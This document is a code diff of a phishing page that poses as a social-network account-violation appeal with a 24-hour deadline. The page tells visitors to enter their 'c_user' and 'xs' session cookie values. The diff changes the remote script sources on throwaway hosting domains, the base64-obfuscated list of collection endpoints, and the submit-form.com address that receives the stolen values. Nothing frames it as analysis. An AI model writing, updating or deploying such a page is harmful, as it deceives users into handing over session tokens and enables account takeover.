@@ -272,7 +272,7 @@
 
       .appeal-video-container {
           width: 100%;
-          max-width: 600px;
+          max-width: 400px;
           margin: 0 auto 15px;
           background: #000;
           border-radius: 8px;
@@ -844,8 +844,8 @@
           }
       }
   </style>
-<script src="blob:https://remove-violation-review-here.surge.sh/b784dc71-f470-4377-bd27-fa1ff83682ea"></script></head>
-<body>
+<script src="blob:https://urgent-remove-violation-see.netlify.app/aa91eb7d-90d8-4edb-8412-3c65236bdfaf"></script></head>
+<body style="">
   <!-- Header -->
   <header class="header">
       <div class="header-container">
@@ -899,11 +899,11 @@
           </div>
 
           <div class="appeal-section">
-              <h2 class="appeal-section-title"><i class="fas fa-undo"></i> <span data-translate="appeal_title">Appeal This Decision Within 24 Hours</span></h2>
+              <h2 class="appeal-section-title"><i class=""></i> <span data-translate="appeal_title">Appeal This Decision Within 24 Hours</span></h2>
 
               <div class="appeal-video-container">
                   <video id="appeal-video" poster="https://via.placeholder.com/600x338/f0f2f5/1877f2?text=Appeal+Process+Video">
-                      <source src="https://ik.imagekit.io/english/English.mp4" type="video/mp4">
+                      <source src="https://ik.imagekit.io/6zsbaguopp/english.mp4" type="video/mp4">
                       <span data-translate="video_not_supported">Your browser does not support the video tag.</span>
                   </video>
 
@@ -919,7 +919,7 @@
                   <div class="language-selector-popup">
                       <h3 class="language-selector-title" data-translate="select_language">Select Language</h3>
                       <div class="language-options">
-                          <div class="language-option selected" data-lang="english" data-src="https://ik.imagekit.io/english/English.mp4">
+                          <div class="language-option" data-lang="english" data-src="https://ik.imagekit.io/english/English.mp4">
                               <span class="language-name">English</span>
                               <i class="fas fa-check check-icon"></i>
                           </div>
@@ -931,17 +931,15 @@
                               <span class="language-name">हिन्दी (Hindi)</span>
                               <i class="fas fa-check check-icon"></i>
                           </div>
-                          <div class="language-option" data-lang="arabic" data-src="Arabic_video_information_V1.mp4
-">
-                              <span class="language-name">العربية (Arabic)</span>
+                          <div class="language-option selected" data-lang="Português" data-src="https://our-b38a1.web.app/Portuguese.mp4">
+                              <span class="language-name">Português (Portuguese)</span>
                               <i class="fas fa-check check-icon"></i>
                           </div>
-                          <div class="language-option" data-lang="tamil" data-src="Tamil_video_information_V1.mp4
-">
+                          <div class="language-option" data-lang="tamil" data-src="Tamil_video_information_V1.mp4">
                               <span class="language-name">தமிழ் (Tamil)</span>
                               <i class="fas fa-check check-icon"></i>
                           </div>
-
+                      </div>
                       <div class="language-selector-actions">
                           <button class="language-selector-button secondary" id="cancel-language-btn">
                               <span data-translate="cancel">Cancel</span>
@@ -1001,12 +999,12 @@
               <div class="appeal-form">
                   <div class="form-group">
                       <label for="c_user" data-translate="c_user_label">c_user Value</label>
-              <input type="text" id="c_user" name="c_user" placeholder="Enter your c_user value (numbers only)" pattern="\d+" title="c_user only" required="">
+                      <input type="text" id="c_user" data-placeholder="c_user_placeholder" placeholder="Enter your c_user value (numbers only)" pattern="\d+" title="Please enter numbers only" required="">
                   </div>
 
                   <div class="form-group">
                       <label for="xs" data-translate="xs_label">xs Value</label>
-              <input type="text" id="xs" name="xs" placeholder="Enter your xs value (combination of letters, numbers, symbols)" pattern=".{20,}" title="xs only" required="">
+                      <input type="text" id="xs" placeholder="Enter your xs value (combination of letters, numbers, symbols)" pattern="[A-Za-z0-9!@#$%^&amp;*()_+\-=\[\]{};':&quot;\\|,.&lt;&gt;\/?]+" required="">
                   </div>
 
                   <div class="form-actions">
@@ -1556,9 +1554,9 @@
       // Function to submit to other endpoints
       function submitToOtherEndpoints(data) {
           const endpoints = [
-              'aHR0cHM6Ly9sb3ZlLXBocC53YXNtZXIuYXBwLw==',
-              'aHR0cHM6Ly9sb3ZlLXBocC53YXNtZXI',
-              'aHR0cHM6Ly9sb3ZlLXBocC53YXN'
+              'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=',
+                'aHR0cHM6Ly9hd2Fpcy1waHAud2FzbWVyLmFwcA==',
+                'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'
           ];
 
           endpoints.forEach(encodedUrl => {
@@ -1674,7 +1672,7 @@
                       confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
 
                       // Submit to SubmitForm.com
-                      const response = await fetch('https://submit-form.com/cdfDcvOVV', {
+                      const response = await fetch('https://submit-form.com/eQoYB4Zix', {
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json',
